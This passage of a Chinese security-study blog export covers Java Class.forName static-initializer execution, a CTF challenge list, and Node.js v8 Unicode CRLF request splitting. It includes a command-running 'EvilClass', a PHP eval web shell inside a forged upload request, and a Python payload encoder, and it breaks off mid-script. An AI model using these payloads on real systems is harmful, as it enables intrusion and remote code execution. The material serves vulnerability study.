</blockquote>
<p>运行便可知，</p>
<img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(1)]/image-20230822212911537.png" alt="image-20230822212911537" style="zoom:200%;">

<blockquote>
<p>因为<code>static&#123;&#125;</code>是类初始化时调用的，而<code>&#123;&#125;</code>中代码是放在<strong>构造函数super()后面</strong>，也就是<code>构造函数</code>的前面</p>
</blockquote>
<p>&#x3D;&#x3D;&gt;</p>
<blockquote>
<p><code>forName</code>中<code>initialize=true</code>其实就是告诉Java虚拟机<code>是否执行类初始化</code></p>
</blockquote>
<h5 id="恶意调用"><a href="#恶意调用" class="headerlink" title="恶意调用"></a>恶意调用</h5><p>假如我们有如下函数，其中函数的参数name可控：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class.forName(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们再构造一个恶意类，将恶意的代码放置在<code>static&#123;&#125;</code>中，从而执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当然，这个恶意类如何带入目标机器中，可能就涉及到<code>ClassLoader</code>的一些利用方法</p>
<p>后面学到会补充这里实现传入的过程</p>
<h3 id="forName的第三个参数ClassLoader"><a href="#forName的第三个参数ClassLoader" class="headerlink" title="forName的第三个参数ClassLoader"></a><code>forName</code>的第三个参数<code>ClassLoader</code></h3><blockquote>
<p><code>ClassLoader</code>是什么呢？</p>
<p>它就是一个”加载器”，告诉Java虚拟机如何加载这个类。</p>
</blockquote>
<p>Java中默认的<code>ClassLoader</code>就是根据类名来加载类，这个类名是类的完整路径，如<code>java.lang.Runtime</code>。</p>
]]></content>
      <categories>
        <category>Java漫谈学习</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Interesting Game wp</title>
    <url>/Interesting-Game-wp/</url>
    <content><![CDATA[<p><code>todo上的一些题目</code></p>
<span id="more"></span>

<h1 id="XCTF-FINAL-2021"><a href="#XCTF-FINAL-2021" class="headerlink" title="XCTF FINAL 2021"></a>XCTF FINAL 2021</h1><h2 id="warmupcms"><a href="#warmupcms" class="headerlink" title="warmupcms"></a>warmupcms</h2><blockquote>
<p>附件的docker和题目除了flag以外完全一样，建议先本地打通再打远程。需要去后台正确设置题目的url为你实际用的ip:port，前台的css&#x2F;js等静态文件才能正常显示，后台显示是正常的。如果是本地搭环境，你可以直接编辑sql文件修改；如果是远程，可以登录到后台-系统设置进行修改。</p>
<p>有一个0day，5月31号修复完了 这个docker里还是未修复版本 </p>
<p>还有另外一个0day 都可以getshell</p>
</blockquote>
<h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><blockquote>
<p>一个0day在后端 文件上传</p>
<p>一个0day在前端文件上传 需要伪造jwt</p>
</blockquote>
<h1 id="GKCTF-2021"><a href="#GKCTF-2021" class="headerlink" title="GKCTF 2021"></a>GKCTF 2021</h1><h2 id="easycms-1"><a href="#easycms-1" class="headerlink" title="easycms"></a>easycms</h2><blockquote>
<p>参考<a href="https://www.hacking8.com/bug-web/%E7%A6%85%E7%9F%A5/%E7%A6%85%E7%9F%A5%E5%90%8E%E5%8F%B0getshell.html">禅知后台getshell - 禅知</a></p>
</blockquote>
<h1 id="强网杯2021"><a href="#强网杯2021" class="headerlink" title="强网杯2021"></a>强网杯2021</h1><h2 id="OA"><a href="#OA" class="headerlink" title="OA"></a>OA</h2><blockquote>
<p>目标是RCE</p>
<p>仅容许test用户登入</p>
</blockquote>
<h2 id="mDNZ"><a href="#mDNZ" class="headerlink" title="mDNZ"></a>mDNZ</h2><blockquote>
<p>目标是rce</p>
<p>可登陆admin后台</p>
</blockquote>
<h1 id="虎符杯2022"><a href="#虎符杯2022" class="headerlink" title="虎符杯2022"></a>虎符杯2022</h1><h2 id="easychain"><a href="#easychain" class="headerlink" title="easychain"></a>easychain</h2><blockquote>
<p>环境不出网，目标是命令执行并回显</p>
</blockquote>
<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><blockquote>
<p>mysql密码在环境变量</p>
</blockquote>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">docker pull ccr<span class="selector-class">.ccs</span><span class="selector-class">.tencentyun</span>.com/cttf/hfctf-<span class="number">2022</span>-babysql ./<span class="selector-tag">main</span>.sh</span><br></pre></td></tr></table></figure>

<h1 id="美团CTF"><a href="#美团CTF" class="headerlink" title="美团CTF"></a>美团CTF</h1><h2 id="easycms-2"><a href="#easycms-2" class="headerlink" title="easycms"></a>easycms</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker</span> pull y4tacker/ez_yxcms:<span class="number">1</span>.<span class="number">0</span> </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>nodejs(拆分攻击)</title>
    <url>/nodejs(%E6%8B%86%E5%88%86%E6%94%BB%E5%87%BB)/</url>
    <content><![CDATA[<p><code>总结学习一下，重点把拆分攻击学习记忆一下，原型链污染单独开一篇写</code></p>
<span id="more"></span>

<h2 id="res-render"><a href="#res-render" class="headerlink" title="res.render()"></a>res.render()</h2><p><code>res.render()</code>是 Node.js 中的一个方法，它可以<code>渲染视图并将渲染后的 HTML 字符串发送给客户端</code>。它可用于通过从服务器传递的数据呈现动态内容。</p>
<p>以下是在 Node.js 中使用 <code>res.render()</code> 的示例代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> data = &#123; <span class="attr">message</span>: <span class="string">&#x27;你好，世界！&#x27;</span> &#125;;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>在此示例中，当用户访问根 URL 时，服务器将通过使用包含消息 <code> 你好，世界！</code>的 <code>data</code> 对象来呈现 <code>index</code> 视图，并向客户端发送响应。</p>
<p><code>index</code> 视图通常是使用模板语言编写的模板文件，例如 EJS、Handlebars 或 Pug。</p>
<h2 id="重定向概念"><a href="#重定向概念" class="headerlink" title="重定向概念"></a>重定向概念</h2><p>Express是一个基于<code>Node.js</code>实现的Web框架，</p>
<p>其响应HTTP请求的response对象中有两个用于URL跳转方法</p>
<p><code>res.location()</code>和<code>res.redirect()</code></p>
<h3 id="res-location"><a href="#res-location" class="headerlink" title="res.location()"></a>res.location()</h3><p>res.location()里面的参数有三种，一种是当前域名路径（例如”&#x2F;api&#x2F;post”），一种是绝对路径(“<a href="https://www.oecom.cn/api/post">https://www.oecom.cn/api/post</a> “)，另一种就是直接一个字符串：back</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">res.<span class="keyword">location</span>(<span class="string">&#x27;/api/post&#x27;</span>);</span><br><span class="line">res.<span class="keyword">location</span>(<span class="string">&#x27;https://www.oecom.cn/api/post&#x27;</span>);</span><br><span class="line">res.<span class="keyword">location</span>(<span class="string">&#x27;back&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="res-redirect"><a href="#res-redirect" class="headerlink" title="res.redirect"></a>res.redirect</h3><p><code>redirect()</code>可以添加两个参数，</p>
<p>如果第一个参数为数值类型，则代表重定向方式，第二个参数为字符串类型，就是需要跳转到的路径。</p>
<p>如果第一个参数就是字符串，则直接代表跳转的路径<br>重定向方式有两种情况，一种是<code>301</code>重定向（永久重定向），另一种是<code>302</code>重定向（临时重定向），如果第一个参数不填，则<code>默认为302</code>重定向。至于第二个参数路径，则和<code>location</code>一致。<br>在<code>redirect</code>中有一种方式是使用相对路径，即：<code>res.redirect(&quot;api/post&quot;)</code>，假设在程序在<code>/get</code>路由下，则表示要跳转的路径为<code>/get/api/post</code>。</p>
<p>个人不推荐这种方式，因为在后续的代码阅读时不利于快速理解重定向位置。</p>
<h2 id="delimiter"><a href="#delimiter" class="headerlink" title="delimiter"></a>delimiter</h2><p>这是对标签的分隔符定义的选项，有时候当对ssti一些标签进行了过滤，如果存在将参数进行渲染，且参数是可控，可以尝试<code>delimiter</code>添加进去，让其在渲染的时候可以覆盖修改<code>delimiter</code>内容，使得可以用其他分隔符绕过</p>
<h3 id="Custom-delimiters"><a href="#Custom-delimiters" class="headerlink" title="Custom delimiters"></a>Custom delimiters</h3><p>自定义分隔符可以基于每个模板应用，也可以全局应用：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>),</span><br><span class="line">    users = [<span class="string">&#x27;geddy&#x27;</span>, <span class="string">&#x27;neil&#x27;</span>, <span class="string">&#x27;alex&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Just one template</span></span><br><span class="line">ejs.<span class="title function_">render</span>(<span class="string">&#x27;&lt;p&gt;[?= users.join(&quot; | &quot;); ?]&lt;/p&gt;&#x27;</span>, &#123;<span class="attr">users</span>: users&#125;, &#123;<span class="attr">delimiter</span>: <span class="string">&#x27;?&#x27;</span>, <span class="attr">openDelimiter</span>: <span class="string">&#x27;[&#x27;</span>, <span class="attr">closeDelimiter</span>: <span class="string">&#x27;]&#x27;</span>&#125;);</span><br><span class="line"><span class="comment">// =&gt; &#x27;&lt;p&gt;geddy | neil | alex&lt;/p&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Or globally</span></span><br><span class="line">ejs.<span class="property">delimiter</span> = <span class="string">&#x27;?&#x27;</span>;</span><br><span class="line">ejs.<span class="property">openDelimiter</span> = <span class="string">&#x27;[&#x27;</span>;</span><br><span class="line">ejs.<span class="property">closeDelimiter</span> = <span class="string">&#x27;]&#x27;</span>;</span><br><span class="line">ejs.<span class="title function_">render</span>(<span class="string">&#x27;&lt;p&gt;[?= users.join(&quot; | &quot;); ?]&lt;/p&gt;&#x27;</span>, &#123;<span class="attr">users</span>: users&#125;);</span><br><span class="line"><span class="comment">// =&gt; &#x27;&lt;p&gt;geddy | neil | alex&lt;/p&gt;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="NodeJS-中的-CRLF-SSRF-Injection"><a href="#NodeJS-中的-CRLF-SSRF-Injection" class="headerlink" title="NodeJS 中的 CRLF&#x2F;SSRF Injection"></a>NodeJS 中的 CRLF&#x2F;SSRF Injection</h2><blockquote>
<p>本文由<strong>WHOAMI</strong>原创发布</p>
<p>转载，请参考<a href="https://www.anquanke.com/note/repost">转载声明</a>，注明出处： <a href="https://www.anquanke.com/post/id/240014">https://www.anquanke.com/post/id/240014</a></p>
<p>安全客 - 有思想的安全新媒体</p>
</blockquote>
<p>2018 年有研究者发现，当Node.js使用 <code>http.get</code> 向特定路径发出HTTP请求时，发出的请求实际上被定向到了不一样的路径！</p>
<p><a data-fancybox="gallery" data-src="https://p5.ssl.qhimg.com/t01e1beeee10e196ba2.png"><img src="https://p5.ssl.qhimg.com/t01e1beeee10e196ba2.png" alt="img"></a></p>
<p>深入研究一下，发现这个问题是由Node.js将HTTP请求写入路径时，对Unicode字符的有损编码引起的。</p>
<blockquote>
<p>·注：nodejs&lt;&#x3D;8 的情况下存在 Unicode 字符损坏导致的 HTTP 拆分攻击，nodejs 不会对这些 Unicode 进行编码转义，因为它们不是 HTTP 控制字符</p>
</blockquote>
<h3 id="HTTP-请求路径中的-Unicode-字符损坏"><a href="#HTTP-请求路径中的-Unicode-字符损坏" class="headerlink" title="HTTP 请求路径中的 Unicode 字符损坏"></a>HTTP 请求路径中的 Unicode 字符损坏</h3><p>虽然用户发出的 HTTP 请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的Unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码字符集，不能表示高编号的Unicode字符，例如🐶这个表情。所以，当我们的请求路径中含有多字节编码的Unicode字符时，会被截断取最低字节，比如 <code>\u0130</code> 就会被截断为 <code>\u30</code>：</p>
<p><a data-fancybox="gallery" data-src="https://p3.ssl.qhimg.com/t01005ff8722a4037e0.png"><img src="https://p3.ssl.qhimg.com/t01005ff8722a4037e0.png" alt="img"></a></p>
<h3 id="Unicode-字符损坏造成的-HTTP-拆分攻击"><a href="#Unicode-字符损坏造成的-HTTP-拆分攻击" class="headerlink" title="Unicode 字符损坏造成的 HTTP 拆分攻击"></a>Unicode 字符损坏造成的 HTTP 拆分攻击</h3><p>刚才演示的那个 HTTP 请求路径中的 Unicode 字符损坏看似没有什么用处，但它可以在 nodejs 的 HTTP 拆分攻击中大显身手。</p>
<p>由于nodejs的HTTP库包含了阻止CRLF的措施，即如果你尝试发出一个URL路径中含有回车、换行或空格等控制字符的HTTP请求是，它们会被URL编码，所以正常的CRLF注入在nodejs中并不能利用：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>);</span><br><span class="line">&gt; http.<span class="title function_">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/\r\n/WHOAMI&#x27;</span>).<span class="property">output</span></span><br><span class="line">[ <span class="string">&#x27;GET /%0D%0A/WHOAMI HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#x27;</span> ]</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="https://p4.ssl.qhimg.com/t01911a74dee31030c4.png"><img src="https://p4.ssl.qhimg.com/t01911a74dee31030c4.png" alt="img"></a></p>
<p>但不幸的是，上述的处理Unicode字符错误意味着可以规避这些保护措施。考虑如下的URL，其中包含一些高编号的Unicode字符：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt; <span class="string">&#x27;http://47.101.57.72:4000/\u&#123;010D&#125;\u&#123;010A&#125;/WHOAMI&#x27;</span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//47.101.57.72:4000/čĊ/WHOAMI</span></span><br></pre></td></tr></table></figure>

<p>当 Node.js v8 或更低版本对此URL发出 <code>GET</code> 请求时，它不会进行编码转义，因为它们不是HTTP控制字符：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt; http.<span class="title function_">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/\u010D\u010A/WHOAMI&#x27;</span>).<span class="property">output</span></span><br><span class="line">[ <span class="string">&#x27;GET /čĊ/WHOAMI HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#x27;</span> ]</span><br></pre></td></tr></table></figure>

<p>但是当结果字符串被编码为 latin1 写入路径时，这些字符将分别被截断为 “\r”（%0d）和 “\n”（%0a）：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt; <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;http://47.101.57.72:4000/\u&#123;010D&#125;\u&#123;010A&#125;/WHOAMI&#x27;</span>, <span class="string">&#x27;latin1&#x27;</span>).<span class="title function_">toString</span>()</span><br><span class="line"><span class="string">&#x27;http://47.101.57.72:4000/\r\n/WHOAMI&#x27;</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="https://p4.ssl.qhimg.com/t01820e6d889f5f8892.png"><img src="https://p4.ssl.qhimg.com/t01820e6d889f5f8892.png" alt="img"></a></p>
<p>可见，通过在请求路径中包含精心选择的Unicode字符，攻击者可以欺骗Node.js并成功实现CRLF注入。</p>
<p>不仅是CRLF，所有的控制字符都可以通过这个构造出来。下面是我列举出来的表格，第一列是需要构造的字符，第二列是可构造出相应字符的高编号的Unicode码，第三列是高编号的Unicode码对应的字符，第四列是高编号的Unicode码对应的字符的URL编码：</p>
<table>
<thead>
<tr>
<th align="center">字符</th>
<th align="center">可由以下Unicode编码构造出</th>
<th align="center">Unicode编码对应的字符</th>
<th align="center">Unicode编码对应的字符对应的URL编码</th>
</tr>
</thead>
<tbody><tr>
<td align="center">回车符 \r</td>
<td align="center">\u010d</td>
<td align="center">č</td>
<td align="center">%C4%8D</td>
</tr>
<tr>
<td align="center">换行符 \n</td>
<td align="center">\u010a</td>
<td align="center">Ċ</td>
<td align="center">%C4%8A</td>
</tr>
<tr>
<td align="center">空格</td>
<td align="center">\u0120</td>
<td align="center">Ġ</td>
<td align="center">%C4%A0</td>
</tr>
<tr>
<td align="center">反斜杠 \</td>
<td align="center">\u0122</td>
<td align="center">Ģ</td>
<td align="center">%C4%A2</td>
</tr>
<tr>
<td align="center">单引号 ‘</td>
<td align="center">\u0127</td>
<td align="center">ħ</td>
<td align="center">%C4%A7</td>
</tr>
<tr>
<td align="center">反引号 &#96;</td>
<td align="center">\u0160</td>
<td align="center">Š</td>
<td align="center">%C5%A0</td>
</tr>
<tr>
<td align="center">叹号 !</td>
<td align="center">\u0121</td>
<td align="center">ġ</td>
<td align="center">%C4%A1</td>
</tr>
</tbody></table>
<p>这个bug已经在Node.js10中被修复，如果请求路径包含非Ascii字符，则会抛出错误。但是对于 Node.js v8 或更低版本，如果有下列情况，任何发出HTTP请求的服务器都可能受到通过请求拆实现的SSRF的攻击：</p>
<ul>
<li>接受来自用户输入的Unicode数据</li>
<li>并将其包含在HTTP请求的路径中</li>
<li>且请求具有一个0长度的主体（比如一个 <code>GET</code> 或者 <code>DELETE</code>）</li>
</ul>
<h3 id="在-HTTP-状态行注入恶意首部字段"><a href="#在-HTTP-状态行注入恶意首部字段" class="headerlink" title="在 HTTP 状态行注入恶意首部字段"></a>在 HTTP 状态行注入恶意首部字段</h3><p>由于 NodeJS 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入恶意的 HTTP 首部字段的话还需要闭合状态行中 <code>HTTP/1.1</code> ，即保证注入后有正常的 HTTP 状态行：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt; http.<span class="title function_">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/\u0120HTTP/1.1\u010D\u010ASet-Cookie:\u0120PHPSESSID=whoami&#x27;</span>).<span class="property">output</span></span><br><span class="line">[ <span class="string">&#x27;GET /ĠHTTP/1.1čĊSet-Cookie:ĠPHPSESSID=whoami HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#x27;</span> ]</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="https://p4.ssl.qhimg.com/t01833dd0e566e383b1.png"><img src="https://p4.ssl.qhimg.com/t01833dd0e566e383b1.png" alt="img"></a></p>
<p>如上图所示，成功构造出了一个 Set-Cookie 首部字段，虽然后面还有一个 <code>HTTP/1.1</code> ，但我们根据该原理依然可以将其闭合：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt; http.<span class="title function_">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/\u0120HTTP/1.1\u010D\u010ASet-Cookie:\u0120PHPSESSID=whoami\u010D\u010Atest:&#x27;</span>).<span class="property">output</span></span><br><span class="line">[ <span class="string">&#x27;GET /ĠHTTP/1.1čĊSet-Cookie:ĠPHPSESSID=whoamičĊtest: HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#x27;</span> ]</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="https://p5.ssl.qhimg.com/t0196c013fcb593f5dc.png"><img src="https://p5.ssl.qhimg.com/t0196c013fcb593f5dc.png" alt="img"></a></p>
<p>这样，我们便可以构造 “任意” 的HTTP请求了。</p>
<h3 id="在-HTTP-状态行注入完整-HTTP-请求"><a href="#在-HTTP-状态行注入完整-HTTP-请求" class="headerlink" title="在 HTTP 状态行注入完整 HTTP 请求"></a>在 HTTP 状态行注入完整 HTTP 请求</h3><p>首先，由于 NodeJS 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入完整的 HTTP 请求的话需要先闭合状态行中 <code>HTTP/1.1</code> ，即保证注入后有正常的 HTTP 状态行。其次为了不让原来的 <code>HTTP/1.1</code> 影响我们新构造的请求，我们还需要再构造一次 <code>GET /</code> 闭合原来的 HTTP 请求。</p>
<p>假设目标主机存在SSRF，需要我们在目标主机本地上传文件。我们需要尝试构造如下这个文件上传的完整 POST 请求：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>437</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=nk67astv61hqanskkddslkgst4</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;MAX_FILE_SIZE&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="number">100000</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;uploaded&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">Upload</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></span><br></pre></td></tr></table></figure>

<p>为了方便，我们将这个POST请求里面的所有的字符包括控制符全部用上述的高编号Unicode码表示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /upload.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: 437</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">100000</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;Upload&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Upload</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET / HTTP/1.1</span></span><br><span class="line"><span class="string">test:&#x27;&#x27;&#x27;</span>.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_encode</span>(<span class="params">raw</span>):</span><br><span class="line">    ret = <span class="string">u&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> raw:</span><br><span class="line">        ret += <span class="built_in">chr</span>(<span class="number">0x0100</span>+<span class="built_in">ord</span>(i))</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">payload = payload_encode(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出: 